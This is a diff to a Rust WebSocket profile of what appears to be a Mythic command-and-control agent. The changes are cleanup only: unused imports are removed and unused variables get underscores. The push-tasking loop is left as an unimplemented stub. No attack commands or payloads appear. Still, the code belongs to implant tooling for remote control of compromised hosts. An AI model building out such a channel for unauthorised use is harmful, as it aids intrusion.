@@ -1,16 +1,14 @@
 use crate::profiles;
 use crate::structs::{
-    CheckInMessageResponse, EkeKeyExchangeMessage, EkeKeyExchangeMessageResponse, MythicMessage,
+    EkeKeyExchangeMessage, MythicMessage,
     Profile,
 };
-use crate::tasks;
 use crate::utils;
 use crate::utils::crypto;
 use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
 use chrono::NaiveDate;
 use futures::stream::{SplitSink, SplitStream};
 use futures::{SinkExt, StreamExt};
-use std::collections::HashMap;
 use std::sync::atomic::{AtomicBool, AtomicI32, Ordering};
 use std::sync::RwLock;
 use tokio::net::TcpStream;
@@ -188,7 +186,7 @@ impl Profile for WebsocketProfile {
             }
         };
 
-        let (write, read) = ws_stream.split();
+        let (write, _read) = ws_stream.split();
         let write = std::sync::Arc::new(Mutex::new(write));
 
         // EKE negotiation if needed
@@ -220,15 +218,15 @@ impl Profile for WebsocketProfile {
         let tasking_type = self.tasking_type.read().unwrap().clone();
         if tasking_type == "Push" {
             // Set up push channel
-            let (push_tx, mut push_rx) = mpsc::channel::<MythicMessage>(100);
+            let (push_tx, _push_rx) = mpsc::channel::<MythicMessage>(100);
             {
                 let mut ch = self.push_channel_tx.write().unwrap();
                 *ch = Some(push_tx);
             }
 
             // Spawn push sender
-            let write_clone = write.clone();
-            let profile_ref = &*self;
+            let _write_clone = write.clone();
+            let _profile_ref = &*self;
             // Push mode main loop would go here
             utils::print_debug("WebSocket: Push mode started");
         }
@@ -364,7 +362,7 @@ impl WebsocketProfile {
         &self,
         write: &std::sync::Arc<Mutex<WsSink>>,
     ) -> bool {
-        let (pub_pem, priv_key) = match crypto::generate_rsa_keypair() {
+        let (pub_pem, _priv_key) = match crypto::generate_rsa_keypair() {
             Some(pair) => pair,
             None => return false,
         };
